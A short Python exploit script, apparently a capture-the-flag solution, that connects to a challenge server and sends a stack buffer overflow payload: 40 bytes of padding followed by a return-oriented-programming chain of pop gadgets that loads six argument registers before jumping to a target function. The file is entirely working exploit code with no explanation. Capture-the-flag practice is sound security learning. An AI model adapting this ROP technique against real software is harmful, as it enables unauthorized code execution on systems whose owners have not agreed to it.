import socket
import readline

host = '127.0.0.1'
port = 9000
host = '0.cloud.chals.io'
port = 20712

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))


def recv(info=None, decode=True):
    # TODO
    res = s.recv(4096)
    print(f'[<] {info if info else ""}')
    if decode:
        print(res.decode('utf-8'))
    else:
        print(res)
    return res


def recvuntil(stop, decode=True):
    res = b''
    while stop not in res:
        res += recv(decode=decode)
    return res


def send(data):
    # TODO
    data = data + b'\n' if data[-1] != b'\n' else data
    s.send(data)


def interact():
    for _ in range(100):
        cmd = input('> ').encode('ascii')
        send(cmd)
        recv()


tgt_addr = 0x40146b
pop_rcdx = 0x4011cd
pop_r9r8 = 0x4011d7
pop_rdi = 0x40165b
pop_rsir15 = 0x401659

s1 = 0x402ec9
s2 = 0x402ece
s3 = 0x402ed3
s4 = 0x402ed6
s5 = 0x402eda

payload = b'A'*40
payload += pop_rdi.to_bytes(8, 'little')
payload += s1.to_bytes(8, 'little')
payload += pop_rsir15.to_bytes(8, 'little')
payload += s2.to_bytes(8, 'little')
payload += (0).to_bytes(8, 'little')
payload += pop_rcdx.to_bytes(8, 'little')
payload += s4.to_bytes(8, 'little')
payload += s3.to_bytes(8, 'little')
payload += pop_r9r8.to_bytes(8, 'little')
payload += (0).to_bytes(8, 'little')
payload += s5.to_bytes(8, 'little')
payload += tgt_addr.to_bytes(8, 'little')

send(payload)
recv()
recv()

with open('./payload', 'wb') as f:
    f.write(payload)
